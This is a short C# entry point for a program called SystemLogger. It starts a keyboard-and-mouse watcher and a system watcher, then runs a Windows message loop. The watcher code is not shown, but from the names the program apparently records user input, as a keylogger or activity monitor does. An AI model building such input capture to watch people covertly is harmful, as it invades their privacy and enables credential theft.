using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using SystemLogger.Watchers;


namespace SystemLogger
{
    internal class Program
    {


        static void Main(string[] args)
        {
            Program program = new Program();

            KeyboardAndMouse keyboardAndMouse = new KeyboardAndMouse();
            SystemWatcher watcher = new SystemWatcher();


            watcher.Start();
            keyboardAndMouse.Start();


            Application.Run();

        }


        

    }
}